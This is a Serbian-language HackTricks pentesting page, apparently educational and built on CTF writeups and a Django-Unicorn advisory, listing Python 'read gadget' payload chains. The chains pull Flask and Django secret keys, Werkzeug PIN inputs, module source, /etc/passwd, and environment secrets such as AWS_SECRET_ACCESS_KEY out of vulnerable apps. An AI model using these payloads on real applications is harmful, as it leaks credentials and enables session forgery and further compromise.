# Gadgeti za interno čitanje u Pythonu

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Različite ranjivosti, kao što su [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ili [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogu vam omogućiti da **čitate interne podatke Pythona, ali vam neće omogućiti izvršavanje koda**. Zbog toga će pentester morati da maksimalno iskoristi ove dozvole za čitanje kako bi **dobio osetljive privilegije i eskalirao ranjivost**.

### Flask - Čitanje secret key-a

Glavna stranica Flask aplikacije će verovatno imati globalni objekat **`app`**, u kojem je **secret** konfigurisan.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
U ovom slučaju moguće je pristupiti ovom objektu koristeći bilo koji gadget za **pristup globalnim objektima** sa stranice [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

U slučaju kada se **vulnerability nalazi u drugom Python fajlu**, potreban vam je gadget za prolazak kroz fajlove kako biste došli do glavnog fajla i **pristupili globalnom objektu `app.secret_key`**, a zatim mogli da [**eskalirate privilegije** poznavajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload poput ovog [iz ovog writeup-a](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Koristite ovaj payload da biste **pročitali `app.secret_key`**. Ako originalni bug takođe omogućava write primitive (na primer, class pollution), isti path može da se koristi za zamenu ove vrednosti i potpisivanje privilegovanijih Flask cookies.

### Werkzeug - machine_id i node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) omogućiće vam pristup vrednostima **machine_id** i **uuid** čvora, koje predstavljaju **privatne delove** potrebne za [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) i pristup Python konzoli na `/console` ako je **debug mode enabled**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Imajte na umu da možete dobiti **lokalnu putanju servera do `app.py`** generisanjem neke **greške** na web stranici koja će vam **prikazati putanju**.

Ako je vulnerability u drugom Python fajlu, proverite prethodni Flask trick za pristup objektima iz glavnog Python fajla.

### Django - SECRET_KEY i settings modul

Django settings objekat se kešira u `sys.modules` čim se aplikacija pokrene. Uz samo read primitive možete leak-ovati **`SECRET_KEY`**, fallback ključeve, kredencijale baze podataka ili saltove za potpisivanje:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ako se ranjivi gadget nalazi u drugom modulu, prvo prođite kroz globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` su podjednako vredni kao i trenutni `SECRET_KEY`: oni i dalje validiraju stare potpisane vrednosti tokom rotacije.<sup>[[1]](#references)</sup> Takođe otkrijte `SESSION_ENGINE` i `SESSION_SERIALIZER` da biste brzo utvrdili da li je uticaj ograničen samo na falsifikovanje cookie-ja ili omogućava nešto ozbiljnije. Za detalje o uticaju na web, pogledajte stranicu [**Django pentesting**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - čitanje izvornog koda i datoteka

Učitani Python moduli obično zadržavaju `__loader__`. Loader-i zasnovani na datotekama često izlažu `get_source()` i `get_data()`, koji su savršeni **primitivi samo za čitanje** kada već možete da pristupite objektu modula, ali ne i funkciji `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Ovo je veoma korisno za dump **config modules, blueprints, helper files ili hidden routes** i pronalaženje API keys, DSNs, putanja do flagova ili dodatnih gadget entry points.

Ako imate samo subclass enumeration, pretražite loader po imenu umesto hard-kodiranja indeksa:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globalne promenljive frame-a generatora / coroutine-a

Ako možete da kreirate ili dohvatite generator/coroutine objekat, njegov frame može da leak-uje globalne promenljive **bez potrebe za bilo kakvim `__globals__` gadget-om**. Ovo je korisno protiv filtera koji blokiraju samo dunder imena i zanemaruju atribute frame-a kao što su `gi_frame`, `ag_frame`, `cr_frame` ili `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Kada dođete do globalnih promenljivih frame-a, nastavite potpuno isto kao kod drugih gadgets (`sys.modules`, settings objekti, `os.environ`, itd.). Noviji sandbox escape-i stalno ponovo otkrivaju ovo jer `gi_frame` i `f_globals` nisu dunder atributi i često prežive naivne deny-liste.

### Environment variables / cloud creds via loaded modules

Mnogi jail-ovi i dalje negde importuju `os` ili `sys`. Možete zloupotrebiti bilo koju dostupnu funkciju `__init__.__globals__` da biste prešli na već importovani `os` modul i izlistali **environment variables** koje sadrže API tokene, cloud ključeve ili flagove:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ako je indeks podklase filtriran, koristite loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables su često jedine tajne potrebne za prelazak sa čitanja na potpunu kompromitaciju (cloud IAM ključevi, database URL-ovi, ključevi za potpisivanje itd.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) je omogućavao **class pollution** putem posebno kreiranih component requests. Postavljanje property path-a kao što je `__init__.__globals__` omogućavalo je napadaču pristup globals komponentnog modula i svim importovanim modulima (npr. `settings`, `os`, `sys`). Odatle možete izvući `SECRET_KEY`, `DATABASES` ili credentials servisa bez izvršavanja koda. Exploit chain se zasniva isključivo na čitanju i koristi iste dunder-gadget obrasce kao iznad.<sup>[[5]](#references)</sup>

### Gadget collections for chaining

Nedavni CTF-ovi i pyjail istraživanja pokazuju pouzdane lance za čitanje izgrađene samo pomoću attribute access-a i subclass enumeration-a. Community-maintained liste, kao što je [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogizuju stotine minimalnih gadgeta koje možete kombinovati za prolazak od objekata do `__globals__`, `sys.modules` i konačno do osetljivih podataka.<sup>[[2]](#references)</sup> Dajte prednost pretragama zasnovanim na attribute/name vrednostima u odnosu na sirove subclass indekse, jer se pozicija `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. menja između Python verzija i sa dodatnim importovanim bibliotekama.

## Reference

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
